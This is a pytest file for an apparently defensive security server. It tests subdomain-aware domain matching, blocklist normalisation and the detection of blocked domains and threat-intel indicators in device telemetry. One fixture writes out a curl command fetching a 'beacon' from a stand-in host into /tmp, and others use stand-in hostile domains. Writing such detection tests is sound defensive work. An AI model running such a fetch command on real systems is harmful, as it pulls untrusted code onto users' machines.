"""Subdomain-aware domain matching (server) + blocked-domain detection."""
import pytest

from app.core.netmatch import (extract_host, host_matches_any, host_matches_domain,
                               parent_domains)
from app.services import auth_service
from tests.conftest import ADMIN_HEADERS


@pytest.fixture(autouse=True)
def _reset_rate_limit():
    auth_service.reset_rate_limit()
    yield
    auth_service.reset_rate_limit()


# -- helper unit tests ----------------------------------------------------
def test_extract_host():
    assert extract_host("https://Sub.Example.COM:8443/p?x=1") == "sub.example.com"
    assert extract_host("evil.example.com.") == "evil.example.com"
    assert extract_host("user@host.example.com") == "host.example.com"
    assert extract_host("example.com") == "example.com"
    assert extract_host("") == ""


def test_subdomain_matching():
    assert host_matches_domain("evil.example.com", "example.com")
    assert host_matches_domain("a.b.example.com", "example.com")
    assert host_matches_domain("example.com", "example.com")
    assert host_matches_domain("https://x.example.com/p", "example.com")


def test_boundary_safety_no_false_positives():
    # Must NOT match — these are the classic domain-confusion bypasses.
    assert not host_matches_domain("notexample.com", "example.com")
    assert not host_matches_domain("example.com.evil.com", "example.com")
    assert not host_matches_domain("myexample.com", "example.com")
    assert not host_matches_domain("example.org", "example.com")


def test_parent_domains_and_any():
    assert parent_domains("a.b.example.com") == ["a.b.example.com", "b.example.com",
                                                 "example.com", "com"]
    assert host_matches_any("evil.example.com", ["other.net", "example.com"]) == "example.com"
    assert host_matches_any("safe.org", ["example.com"]) is None


# -- end-to-end: blocking a domain covers subdomains ----------------------
def _block_domain(client, value):
    r = client.post("/api/admin/blocklist", headers=ADMIN_HEADERS,
                    json={"kind": "domain", "value": value})
    assert r.status_code in (200, 201), r.text


def _emit(client, headers, **details):
    client.post("/api/agent/telemetry", json={"events": [
        {"source": "process", "action": "exec", "severity": "info", "summary": "x",
         "details": details}]}, headers=headers)


def test_url_blocklist_entry_normalized_to_host(client):
    _block_domain(client, "https://evil.example.com/malware?x=1")
    bl = client.get("/api/admin/blocklist", headers=ADMIN_HEADERS).json()
    domains = [e["value"] for e in bl if e["kind"] == "domain"]
    assert "evil.example.com" in domains  # stored as bare host


def test_blocked_domain_catches_subdomain(client, enrolled_device):
    _block_domain(client, "example.com")
    _emit(client, enrolled_device["headers"], domain="evil.example.com")
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    hits = [d for d in dets if d["rule_id"] == "blocklist_domain"]
    assert len(hits) == 1
    assert hits[0]["details"]["blocked_domain"] == "example.com"
    assert hits[0]["details"]["observed"] == "evil.example.com"


def test_blocked_domain_catches_url_in_command_line(client, enrolled_device):
    _block_domain(client, "example.com")
    _emit(client, enrolled_device["headers"],
          command_line="curl -s https://a.b.example.com/beacon -o /tmp/x")
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    assert any(d["rule_id"] == "blocklist_domain" for d in dets)


def test_unrelated_domain_not_flagged(client, enrolled_device):
    _block_domain(client, "example.com")
    _emit(client, enrolled_device["headers"], domain="notexample.com")
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    assert not any(d["rule_id"] == "blocklist_domain" for d in dets)


def test_domain_ioc_matches_subdomain(client, enrolled_device):
    client.post("/api/admin/intel/iocs", headers=ADMIN_HEADERS,
                json={"ioc_type": "domain", "value": "bad.example", "confidence": 90})
    _emit(client, enrolled_device["headers"], domain="c2.bad.example")
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    assert any(d["rule_id"] == "ioc_match" for d in dets)
